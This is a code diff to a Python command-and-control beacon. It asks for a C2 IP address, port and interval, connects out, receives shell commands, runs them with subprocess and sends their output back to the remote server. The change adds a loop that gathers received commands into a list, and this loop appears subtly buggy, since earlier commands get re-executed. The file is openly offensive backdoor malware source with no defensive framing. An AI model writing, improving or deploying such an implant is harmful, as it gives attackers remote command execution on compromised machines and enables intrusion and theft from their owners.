@@ -10,6 +10,7 @@ rhost = str(input("C2 IP Address: " ))
 rport = int(input("C2 Port: "))
 wait = int(input("Beacon interval in seconds: "))
 rserver = (rhost, rport)
+cmd = []
 
 # Connect out and if server is up, retrieve a command and send back the stderr/stdout
 while True:
@@ -19,11 +20,19 @@ while True:
     except socket.error:
         print("Dad isn't home")
     else:
-        cmd = s.recv(1024).decode()
-        print(cmd)
-        cmdarg = str(cmd).split(" ")
-        execute = subprocess.run(cmdarg, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
-        s.sendall(bytes(execute.stdout, "utf-8"))
+        while True:
+            data = s.recv(1024).decode()
+            cmd.append(data)
+            if data is None:
+                s = None
+                break
+            else:
+                print(cmd)
+                for c in cmd:
+                    cmdarg = (c).split(" ")
+                    execute = subprocess.run(cmdarg, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+                    s.sendall(bytes(execute.stdout, "utf-8"))
+                    data = None
 
 # Close socket and take a break.
     s = None
